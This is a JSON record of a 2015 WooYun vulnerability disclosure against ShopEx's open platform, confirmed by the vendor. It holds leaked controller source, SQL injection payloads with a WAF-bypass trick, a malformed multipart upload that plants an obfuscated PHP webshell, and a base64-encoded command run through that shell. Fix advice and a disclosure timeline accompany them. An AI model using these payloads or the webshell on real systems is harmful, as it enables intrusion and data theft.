{"id": 73076, "wybug_id": "wooyun-2015-0160847", "wybug_title": "Shopex开放平台SQL注入和Getshell", "wybug_corp": "ShopEx", "wybug_author": "loopx9", "wybug_date": "2015-12-14 19:10", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["信息泄露", "源码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： SQL注入. 详细说明：  BBScan 扫到一个git信息泄露: \nhttp://open.shopex.cn/.git/\n使用rip-git.pl把源码下载下来.源码审计发现一个sql注入:open.shopex.cn\\core\\application\\controllers\\docs.php:\n/**     * API接口搜索列表页     *     * @access public     *     * @return void     */    public function api_search($category_id){        $this->data['navigations'][] = array('name'=>'开发文档','url'=>'');        $this->data['navigations'][] = array('name'=>'API文档','url'=>site_url('/docs/api_list/'.$category_id));\t\t$platform_id = isset($_GET['platform_id'])?$_GET['platform_id']:0;\t\t$docs_keyword = isset($_GET['docs_keyword'])?trim(urldecode($_GET['docs_keyword'])):'';\t\t$method_type_id = isset($_GET['method_type_id'])?$_GET['method_type_id']:0;        /**         *         * 开发文档页改变布局         */        $this->layout->Layout('doc_details');\t\t/**\t\t *\t\t * 加载API列表模型，并获取API列表数据\t\t */\t\t$this->load->model('method_type_model');\t\t$api_list_data_temp = $this->method_type_model->get_api_list_all();\t\tforeach($api_list_data_temp as $k=>$v){\t\t\t$api_list_data[$v['id']] = $v;\t\t}\t\t$this->data['api_list_data'] = $api_list_data;        /**         *         * 支持平台列表         */        $this->load->model('platform_model');        $platform_list = $this->platform_model->get_platform_list();        $this->data['platform_list'] = $platform_list;\t\t/**\t\t *\t\t * 条件过滤\t\t */\t\t$conditions = '1=1';\t\tif($platform_id>0){\t\t\t$conditions.= ' AND pm.platform_id='.$platform_id;\t\t}\t\tif($docs_keyword!=''){\t\t\t$conditions.= ' AND (m.name like \"%'.$docs_keyword.'%\" OR m.introduction like \"%'.$docs_keyword.'%\")';\t\t}\t\t/**\t\t *\t\t * 左边筛选使用\t\t */\t\t$this->load->model('method_model');\t\t$filter_method_list = $this->method_model->get_method_search_list($conditions);//接口列表\t\t$method_type_id_array = array();\t\tforeach($filter_method_list as $k=>$v){\t\t\t$method_type_id_array[] = $v['method_type_id'];\t\t}\t\tif($method_type_id>0){\t\t\t$conditions.= ' AND mthm.method_type_id='.$method_type_id;\t\t}\t\t/**\t\t *\t\t * 加载API接口模型\t\t */\t\t$this->load->model('method_model');\t\t$method_list_temp = $this->method_model->get_method_search_list($conditions);//接口列表\t\tforeach($method_list_temp as $k=>$v){\t\t\t$temp = isset($api_list_data[$v['method_type_id']])?$api_list_data[$v['method_type_id']]['name']:'temp';\t\t\t$method_list_group[$temp][] = $v;\t\t}\t\t$this->data['method_list_group'] = $method_list_group;\t\t$this->data['method_type_id_array'] = $method_type_id_array;        $this->data['docs_keyword'] = $docs_keyword;        $this->data['platform_id'] = $platform_id;        $this->data['category_id'] = $category_id;\t\t$this->data['method_type_id'] = $method_type_id;//当前列表ID        $this->layout->view('docs/api_search',$this->data);    }\n三个参数存在sql注入: \nplatform_id docs_keyword method_type_id\n搜一下发现已经提交过了: WooYun: Shopex开放平台某处SQL注入  WooYun: Shopex官方某平台存在SQL注入漏洞一枚  WooYun: ShopEx某分站存在注入 漏洞任没有修复，但上了waf.程序是CI框架，默认过滤掉了参数中的utf-8字符，所以在关键字中插入一个%80就能绕过waf了。\nhttp://open.shopex.cn/docs/api_search/1?platform_id=1/extractvalue(1,concat%20(0x7e,us%80er(),0x3a,ver%80sion()))%23\n\n\n\n\n继续翻代码，找到一处任意文件上传:open.shopex.cn\\core\\application\\controllers\\uploads.php:\nclass Uploads extends CI_Controller {\t/**\t * 首页图片上传\t *\t * @access public\t */\tpublic function home_img(){\t\tif(empty($_FILES['image'])){\t\t\t$this->_return_msg('fail','上传内容格式不对！');\t\t}\t\tif(substr($_FILES['image']['type'],0,5)!='image'){\t\t\t$this->_return_msg('fail','请确认上传的是图片！');\t\t}\t\t$image_name = $_FILES['image']['name'];\t\t$image_name_exp = explode('.',$image_name);\t\t$image_name = date('YmdHis').mt_rand(0,1).'.'.$image_name_exp[1];\t\t$uploadfile = FCPATH.'uploads/home_img/'.$image_name;\t\tmove_uploaded_file($_FILES['image']['tmp_name'],$uploadfile);\t\t$data['img'] = base_url('/uploads/home_img/'.$image_name);\t\t$this->_return_msg('succ','成功',$data);\t}...\n利用php multipart/form-data 解析漏洞来绕过waf上传php shell:\nPOST /index.php/uploads/home_img HTTP/1.1User-Agent: curl/7.33.0Host: open.shopex.cnAccept: */*Proxy-Connection: Keep-AliveContent-Length: 341Content-Type: multipart/form-data; boundary=----,xxoo------,xxooContent-Disposition: form-data; name=\"image\"; filename=\"1.jpg\"Content-Type: image/png------Content-Disposition: form-data; name=\"image\"; filename=\"1.php\"Content-Type: image/png<script language=\"php\">@preg_replace('/./e','@'.str_rot13('riny').'(bas'.'e64_decode($_POST[c]))', 'x');</script>------------,xxoo--\nshell:\nhttp://open.shopex.cn/uploads/home_img/201512122130440.php\n\nPOST /uploads/home_img/201512122130440.php HTTP/1.1User-Agent: curl/7.33.0Host: open.shopex.cnAccept: */*Proxy-Connection: Keep-AliveContent-Length: 34Content-Type: application/x-www-form-urlencodedc=ZWNobyBgaWQ7cHdkO2xhc3QgLTIwYDs=\n\n\n另外还有一个sql注入:\nPOST /index.php/passport/passport/login HTTP/1.1Host: 122.144.135.142Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=368fe31461cc0ba9a3e38c0334145b35; CNZZDATA3868185=cnzz_eid%3D1466070748-1449902718-%26ntime%3D1449902718Content-Length: 131biz_id=&entid=')or updatexml(1,co%80ncat(0x7e,us%80er(),ver%80sion()),1)#&pwd=xx&auth_code=cqac&subOk=%E7%99%BB%E5%BD%95&logOk=true\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  删除.git目录或是禁止访问修复sql注入.上传功能限制后缀&用户权限控制   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-14 22:55 厂商回复： 感谢您的提交，我们将尽快处理！！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-17 10:36 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 带我玩)\t\t \n  坐等公开啊..老板    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}